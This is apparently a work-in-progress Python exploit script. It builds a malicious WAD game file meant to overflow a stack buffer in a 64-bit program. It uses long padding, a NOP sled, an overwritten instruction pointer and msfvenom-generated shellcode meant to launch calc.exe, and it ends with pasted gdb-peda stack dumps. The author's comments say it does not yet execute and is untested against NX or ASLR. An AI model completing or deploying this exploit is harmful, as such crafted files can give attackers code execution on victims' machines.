#!/usr/bin/python
# -*- coding: utf-8 -*-

#intended effect - spawn calc.exe
#payload generated w/ msfvenom
###############################
# NOT TESTED WITH NX OR ASLR  #
###############################
#still no exec too :(
#even with $rip=$rsp??

from struct import *

#form file header
buf =  "PWADx"
buf += bytearray('\x00\x00\x00')
buf += "xx"
buf += bytearray('\x00\x00')
buf += "A" * 31800 #offset of $rsp + some random number lol (serendipitous findings ftw)
buf += "\x90" * 1000
buf += pack('<Q', 0x14f1d0) #push any value to $rip - ideally, that would be $rip, but that doesn't work
# see attached image in README.md for current values
buf += pack('<IIII', 0x48c93148, 0xffdde981, 0x8d48ffff, 0xffffef05)
buf += pack('<IIII', 0x07bb48ff, 0x82f86a20, 0x489dc56b, 0x48275831)
buf += pack('<IIII', 0xfffff82d, 0xfbf4e2ff, 0x721ce968, 0x079d0583)
buf += pack('<IIII', 0xc3a92b20, 0x51cc973b, 0xe72a5b68, 0x67cf4e23)
buf += pack('<IIII', 0x9aaae168, 0x27cf4e23, 0xd28ae168, 0x4d2aca23)
buf += pack('<IIII', 0x4bc9276a, 0xab5df423, 0x80840b1c, 0xc6dce547)
buf += pack('<IIII', 0x83b967e9, 0x557027aa, 0x09b03b61, 0x4516e539)
buf += pack('<IIII', 0x52f9221c, 0x071545e0, 0x07b06a20, 0x4ffab1ab)
buf += pack('<IIII', 0x09a8ba21, 0x8cd9dd23, 0x83b14a60, 0x4fcb26bb)
buf += pack('<IIII', 0x09b9a3df, 0x06d54d5f, 0x4bc927f6, 0xab5df423)
buf += pack('<IIII', 0x8f31ab61, 0x3f5cc42a, 0xce091fc0, 0x0fb98968)
buf += pack('<IIII', 0xf7295365, 0x8cd99db3, 0x83b14e60, 0x8cdca3bb)
buf += pack('<IIII', 0x09bc222c, 0x06d4d92b, 0x86732bf0, 0xd79c8de3)
buf += pack('<IIII', 0xdab93261, 0x46c79c35, 0xc3a12b78, 0xeb1e8d31)
buf += pack('<IIII', 0x7daa2b00, 0x5edc9d8b, 0x9073227a, 0xf8629282)
buf += pack('<IIII', 0x38b037df, 0x079dc56a, 0x82f86a20, 0x06104823)
buf += pack('<IIII', 0xc3f86a21, 0x6816f4d1, 0x392d95a7, 0x513f709b)
buf += pack('<IIII', 0x175ed061, 0xd26258d6, 0xaa3ce968, 0x0de1c357)
buf += pack('<IIII', 0xf71891a0, 0x14da7e6e, 0x82920552, 0xdd148432)
buf += pack('<IIII', 0xe39bbfdf, 0x62b3a607, 0x82f80f58, 0x009dc56b)
buf += "\x90" * 640 #'fill' the wadfile #### actually throws off the stack if you do it too much
#buf += pack('<Q', 0x7ff632558514) #$rip = $rsp



f = open("exploit64.wad", "w")
f.write(buf)


##gdb-peda logs
#gdb-peda$ x/wx $rip
#0x14f1d0:       0x48c93148
#gdb-peda$ x/120x $rsp
#0x14f1d0:       0x48c93148      0xffdde981      0x8d48ffff      0xffffef05
#0x14f1e0:       0x07bb48ff      0x82f86a20      0x489dc56b      0x48275831
#0x14f1f0:       0xfffff82d      0xfbf4e2ff      0x721ce968      0x079d0583
#0x14f200:       0xc3a92b20      0x51cc973b      0xe72a5b68      0x67cf4e23
#0x14f210:       0x9aaae168      0x27cf4e23      0xd28ae168      0x4d2aca23
#0x14f220:       0x4bc9276a      0xab5df423      0x80840b1c      0xc6dce547
#0x14f230:       0x83b967e9      0x557027aa      0x09b03b61      0x4516e539
#0x14f240:       0x52f9221c      0x071545e0      0x07b06a20      0x4ffab1ab
#0x14f250:       0x09a8ba21      0x8cd9dd23      0x83b14a60      0x4fcb26bb
#0x14f260:       0x09b9a3df      0x06d54d5f      0x4bc927f6      0xab5df423
#0x14f270:       0x8f31ab61      0x3f5cc42a      0xce091fc0      0x0fb98968
#0x14f280:       0xf7295365      0x8cd99db3      0x83b14e60      0x8cdca3bb
#0x14f290:       0x09bc222c      0x06d4d92b      0x86732bf0      0xd79c8de3
#0x14f2a0:       0xdab93261      0x46c79c35      0xc3a12b78      0xeb1e8d31
#0x14f2b0:       0x7daa2b00      0x5edc9d8b      0x9073227a      0xf8629282
#0x14f2c0:       0x38b037df      0x079dc56a      0x82f86a20      0x06104823
#0x14f2d0:       0xc3f86a21      0x6816f4d1      0x392d95a7      0x513f709b
#0x14f2e0:       0x175ed061      0xd26258d6      0xaa3ce968      0x0de1c357
#0x14f2f0:       0xf71891a0      0x14da7e6e      0x82920552      0xdd148432
#0x14f300:       0xe39bbfdf      0x62b3a607      0x82f80f58      0x009dc56b
#0x14f310:       0x0014f1d0      0x00000000      0x00000000      0x00000000
#0x14f320:       0x0014f430      0x00000000      0xb8491084      0x00007ff7
#0x14f330:       0x00000005      0x00000000      0x000002fb      0x00000000
#0x14f340:       0x00000000      0x00000000      0xffffffff      0x00000000
#0x14f350:       0x001d6401      0x00000000      0x000003f8      0x00000000
#0x14f360:       0x00000000      0x00000000      0x00000000      0x00000000
#0x14f370:       0x00000004      0x00000000      0xb8a1275c      0x00007ff7
#0x14f380:       0x0265ff10      0x00000000      0x348ce140      0x00007ffe
#0x14f390:       0x00001000      0x00000000      0x001d644c      0x00000000
#0x14f3a0:       0x0263b1d0      0x00000000      0x001e49bc      0x00000000
#gdb-peda$
